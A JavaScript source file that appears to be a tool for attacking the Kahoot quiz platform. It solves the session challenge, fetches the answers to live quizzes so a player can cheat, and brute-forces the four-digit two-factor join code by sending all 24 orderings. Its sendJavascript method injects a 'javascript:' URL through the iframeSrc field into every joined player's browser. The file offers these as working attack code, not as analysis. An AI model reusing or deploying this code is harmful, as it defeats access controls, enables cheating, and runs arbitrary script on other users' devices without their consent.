const proxy = "http://" + window.location.hostname + ":3000/";
const clientEvents = {
    getReady: 1,
    startQuestion: 2,
    gameOver: 3,
    timeUp: 4,
    playAgain: 5,
    answerSelected: 6,
    answerResponse: 7,
    revealAnswer: 8,
    startQuiz: 9,
    resetController: 10,
    submitFeedback: 11,
    feedback: 12,
    revealRanking: 13,
    userNameAccepted: 14,
    userNameRejected: 15,
    requestRecoveryDataFromPlayer: 16,
    sendRecoveryDataToController: 17,
    joinTeamMembers: 18,
    joinTeamMembersResponse: 19,
    startTeamTalk: 20,
    skipTeamTalk: 21,
    iframeControllerEvent: 31,
    serverIframeMessage: 32,
    storyBlockGetReady: 40,
    reactionSelected: 41,
    reactionResponse: 42,
    gameBlockStart: 43,
    gameBlockEnd: 44,
    gameBlockAnswer: 45,
    submitTwoFactorAuth: 50,
    twoFactorAuthIncorrect: 51,
    twoFactorAuthCorrect: 52,
    resetTwoFactorAuth: 53
}

class KahootClient {
    constructor(pin, name, url = "https://www.kahoot.it") {
        this.pin = pin;
        this.name = name;
        this.apiUrl = proxy + url;
        this.cometdUrl = "wss://kahoot.it/cometd";
        this.cometd = null;
        this.answers = null;
        this.questionNum = null;
        this.state = 0;
        this.quizName;
        this.solvedChallenge;
        this.session;
        this.clientId;
        this.rawSession;
        this.bearerToken;
        this.error;

        this.onRawMessageController = function (m) { };
        this.onRawMessagePlayer = function (m) { };
        this.onRawMessageStatus = function (m) { };
    }

    connect(callback) {
        const self = this;
        this.testSession(function (existence) {
            if (existence) {
                self.createWebsocket(function () {
                    self.doLogin(function () {
                        callback({
                            success: true,
                            error: null,
                            twoFactor: self.twoFactor
                        });
                    });
                });
            } else {
                callback({
                    success: false,
                    error: "No Session!",
                    twoFactor: self.twoFactor
                });
            }
        });
    }

    //Get the answers of a kahoot game by name - returns (callback) answers
    getGameAnswers(gameName, callback) {
        const self = this;
        if (!this.answers) {
            let headers = {
                "Authorization": "Bearer " + this.bearerToken
            };

            KahootHelper.searchGames(gameName, this.bearerToken, function (response, statusText, req) {
                let answers = [];
                let currEntity = 0;
                if (response.totalHits > 0) {
                    for (let e = 0; e < response.entities.length; e++) {
                        if (response.entities[e].title === gameName) {
                            currEntity = e;
                        }
                    }
                    response = response.entities[currEntity];
                    for (let i = 0; i < response.questions.length; i++) {
                        for (let a = 0; a < response.questions[i].choices.length; a++) {
                            if (response.questions[i].choices[a].correct === true) {
                                answers[i] = {
                                    questionNum: i,
                                    question: response.questions[i].question,
                                    answer: response.questions[i].choices[a],
                                    answerNum: a
                                };
                            }
                        }
                    }
                    self.answers = answers;
                    callback({
                        error: null,
                        answers: answers
                    })
                } else {
                    if (typeof callback === "function") {
                        callback({
                            error: "No games found!"
                        });
                    }
                }
            });
        } else {
            callback({
                error: null,
                answers: self.answers
            });
        }
    }

    //MAIN GAME FUNCTIONS
    sendGameAnswer(answerId) {
        this.cometd.publish("/service/controller", {
            id: clientEvents.gameBlockAnswer,
            type: "message",
            gameid: this.pin,
            host: "kahoot.it",
            content: JSON.stringify(
                {
                    "choice": answerId,
                    "meta": {
                        "lag": 15,
                        "device": {
                            "userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.79 Chrome/61.0.3163.79 Safari/537.36",
                            "screen": {
                                "width": 1440, "height": 870
                            }
                        }
                    }
                }
            )
        }, function (publishAck) { });
    }

    //bruteForceTwoFactor - tries to bruteforce the two factor auth code. pretty easy because of only 24 possibilities.
    bruteForceTwoFactor() {
        let combinations = ["0123", "0132", "0213", "0231", "0321", "0312", "1023", "1032", "1203", "1230", "1302", "1320", "2013", "2031", "2103", "2130", "2301", "2310", "3012", "3021", "3102", "3120", "3201", "3210"]
        for (let i = 0; i < combinations.length; i++) {
            this.twoFactorLogin(combinations[i]);
        }
    }

    //twoFactorLogin - tries to login with two factor code, doesnt return anything. Success is handled at main player loop.
    twoFactorLogin(code) {
        this.cometd.publish("/service/controller", {
            id: clientEvents.submitTwoFactorAuth,
            type: "message",
            gameid: this.pin,
            host: "kahoot.it",
            content: JSON.stringify(
                {
                    "sequence": code
                }
            )
        }, function (publishAck) { });
    }

    //doLogout - returns (callback) boolean success
    doLogout(callback) {
        this.state = 0;
        this.cometd.disconnect(function () {
            if (typeof callback === "function") {
                callback(true);
            }
        });
    }

    //doLogin - returns (callback) boolean success
    doLogin(callback) {
        this.cometd.publish("/service/controller", {
            gameid: this.pin,
            host: "kahoot.it",
            name: this.name,
            type: "login"
        }, function (publishAck) {
            if (typeof callback === "function") {
                callback(true);
            }
        });
    }

    //createWebsocket (startSession) - returns (callback) cometD created using session id and token.
    createWebsocket(callback) {
        const self = this;
        this.cometd = new org.cometd.CometD();
        this.cometd.configure({
            url: this.cometdUrl + "/" + this.pin + "/" + this.session
        });
        this.cometd.websocketEnabled = true;
        this.cometd.handshake(function (h) {
            if (h.successful) {
                let controller = self.cometd.subscribe("/service/controller", function (m) { })
                let player = self.cometd.subscribe("/service/player", function (m) { })
                let status = self.cometd.subscribe("/service/status", function (m) { })
                self.cometd.unsubscribe(controller, function (m) { })
                self.cometd.unsubscribe(player, function (m) { })
                self.cometd.unsubscribe(status, function (m) { })
                controller = self.cometd.subscribe("/service/controller", function (m) {
                    self.onRawMessageController(m);
                    if (m.data.error) {
                        self.state = 3;
                        self.error = m.data.description;
                    }
                })
                player = self.cometd.subscribe("/service/player", function (m) {
                    self.onRawMessagePlayer(m);
                    let tempJson;

                    switch (m.data.id) {
                        case clientEvents.getReady:
                            tempJson = JSON.parse(m.data.content);
                            self.questionNum = tempJson.questionIndex;
                            break;

                        case clientEvents.startQuiz:
                            tempJson = JSON.parse(m.data.content);
                            self.quizName = tempJson.quizName;
                            break;

                        case clientEvents.resetTwoFactorAuth:
                            self.state = 2;
                            break;

                        case clientEvents.twoFactorAuthIncorrect:
                            self.state = 2;
                            break;

                        case clientEvents.twoFactorAuthCorrect:
                            self.state = 1;
                            break;
                    }
                })
                status = self.cometd.subscribe("/service/status", function (m) {
                    self.onRawMessageStatus(m);
                    if (m.data.status === "ACTIVE") {
                        self.state = 1;
                    }
                })
                callback();
            }
        });
    }

    //testSession - returns (callback) boolean depending on existence of session.
    testSession(callback) {
        const self = this;
        $.ajax({
            url: this.apiUrl + "/reserve/session/" + this.pin + "/?" + KahootHelper.getTC(),
            success: function (response, responseCode, req) {
                if (req.status !== 404) {
                    self.rawSession = req.getResponseHeader("x-kahoot-session-token");
                    self.solvedChallenge = KahootHelper.solveChallenge(response.challenge);
                    self.twoFactor = response.twoFactorAuth;
                    self.session = KahootHelper.shiftBits(self.rawSession, self.solvedChallenge);
                    callback(true);
                } else {
                    callback(false);
                }
            },
            error: function() {
                callback(false);
            }
        });
    }
}

class KahootServer {
    constructor() {
        this.pin;
        this.uuid;
        this.quiz;
        this.cometd;

        this.players = [];
        this.options = {
            "gameMode": "normal",
            "twoFactorAuth": false,
            "namerator": false
        };
    }

    sendJavascript(script) {
        server.send("/service/player", {
            type: "message",
            id: 2,
            content: JSON.stringify({
                questionIndex: 1,
                quizType: "quiz",
                quizQuestionAnswers: [1],
                iframeSrc: "javascript:" + script + "; //"
            })
        });
    }

    sendRaw(rawMessage, callback) {
        rawMessage = rawMessage[0];
        rawMessage.data.gameid = this.pin;
        this.cometd.publish(rawMessage.channel, rawMessage.data, callback);
    }

    send(channel, data, callback) {
        data.host = "play.kahoot.it";
        data.gameid = this.pin;
        this.cometd.publish(channel, data, callback);
    }

    initialize(callback) {
        const self = this;

        this.reservePin(function (response, responseCode, req) {
            self.pin = parseInt(response);

            self.reserveSession(response, function (response, responseCode, req) {
                const challenge = KahootHelper.solveChallenge(response.challenge);
                const rawSession = req.getResponseHeader("x-kahoot-session-token");
                const session = KahootHelper.shiftBits(rawSession, challenge);
                self.cometd = new org.cometd.CometD();

                self.cometd.configure({
                    url: "wss://play.kahoot.it/cometd/" + self.pin + "/" + session,
                });

                self.cometd.websocketEnabled = true;
                self.cometd.handshake(function (h) {
                    if (h.successful) {
                        self.cometd.subscribe("/service/player", function (m) {
                            self.emit("message", m)
                        });

                        self.cometd.subscribe("/controller/" + self.pin, function (m) {
                            self.emit("message", m);

                            if (m.data.type === "joined") {
                                self.send("/service/player", {
                                    cid: "0",
                                    content: JSON.stringify({
                                        playerName: m.data.name,
                                        quizType: "quiz"
                                    })
                                });
                            }
                        });

                        self.send("/service/player", {
                            "type": "started"
                        }, function () {
                            callback(self.pin);
                        });
                    }
                })
            });
        });
    }

    reservePin(callback) {
        $.ajax({
            url: proxy + "https://play.kahoot.it/reserve/session/?" + KahootHelper.getTC(),
            method: "POST",
            data: JSON.stringify(this.options),
            success: callback
        });
    }

    reserveSession(pin, callback) {
        $.ajax({
            url: proxy + "https://play.kahoot.it/reserve/session/" + pin + "/?" + KahootHelper.getTC(),
            method: "GET",
            success: callback
        });
    }
}

class KahootHelper {
    static getTC() {
        return new Date().getTime();
    }

    static searchGames(gameName, bearerToken, callback) {
        let headers = {
            "Authorization": "Bearer " + bearerToken
        };

        $.ajax({
            method: "GET",
            url: proxy + "https://create.kahoot.it/rest/kahoots/search/public?query=" + gameName.replace(/[.,\/#!$%\^&\*;:{}=\-_`~()]/g, "") + "&limit=100" + "&_=" + new Date().getTime(),
            headers: headers,
            success: callback
        });
    }

    static getGame(gameUUID, bearerToken, callback) {
        let headers = {
            "Authorization": "Bearer " + bearerToken
        };

        $.ajax({
            method: "GET",
            url: proxy + "https://play.kahoot.it/rest/kahoots/" + gameUUID + "?_=" + this.getTC(),
            headers: headers,
            success: callback
        });
    }

    //getBearerToken - gets bearer token by loggin in to kahoot, returns (callback) object
    static getBearerToken(username, password, callback) {
        let formData = "";
        let headers = {
            "x-kahoot-login-gate": "enabled",
            "Content-Type": "application/json"
        };

        formData = {
            username: username,
            password: password,
            grant_type: "password"
        }

        formData = JSON.stringify(formData);

        $.ajax({
            method: "POST",
            url: proxy + "https://create.kahoot.it/rest/authenticate",
            data: formData,
            headers: headers,
            success: function (response, statusText, req) {
                if (req.status !== 401) {
                    if (typeof callback === "function") {
                        if (response.access_token) {
                            callback({
                                error: null,
                                bearerToken: response.access_token,
                                expiration: response.expires
                            });
                        } else {
                            callback({
                                error: "Auth failed, wrong username or password!"
                            });
                        }
                    }
                } else {
                    if (typeof callback === "function") {
                        callback({
                            error: "Auth failed, wrong username or password!"
                        });
                    }
                }
            }, error: function (response, statusText, req) {
                if (req.status !== 401) {
                    if (typeof callback === "function") {
                        callback({
                            error: "Auth failed, wrong username or password!"
                        });
                    }
                }
            }
        });
    }

    static shiftBits(session, challenge) {
        const sessionBytes = this.convertDataToBinary(atob(session));
        const challengeBytes = this.convertDataToBinary(challenge);
        const bytesList = [];
        for (let i = 0; i < sessionBytes.length; i++) {
            bytesList.push(String.fromCharCode(sessionBytes[i] ^ challengeBytes[i % challengeBytes.length]));
        }
        return bytesList.join("");
    }

    static convertDataToBinary(raw) {
        const rawLength = raw.length;
        const tempArray = new Uint8Array(new ArrayBuffer(rawLength));

        for (let i = 0; i < rawLength; i++) {
            tempArray[i] = raw.charCodeAt(i);
        }
        return tempArray;
    }

    static solveChallenge(challenge) {
        let toDecode = challenge.split("'")[1].split("'")[0];
        const offset = eval(challenge.split("var offset = ")[1].split(";")[0]);
        const decodeMod = parseInt(challenge.split(") % ")[1].split(")")[0].trim());
        const decodePlus = parseInt(challenge.split(decodeMod)[1].split("+ ")[1].split(")")[0]);
        let final = "";

        for (let i = 0; i < toDecode.length; i++) {
            const char = toDecode[i];
            final += String.fromCharCode((((char.charCodeAt(0) * i) + offset) % decodeMod) + decodePlus);
        }

        return final;
    }

    static waitForSocketConnection(socket, callback) {
        setTimeout(
            function () {
                if (socket.readyState === 1) {
                    if (typeof callback === "function") {
                        callback();
                    }
                    return;
                } else {
                    waitForSocketConnection(socket, callback);
                }
            }, 5);
    }
}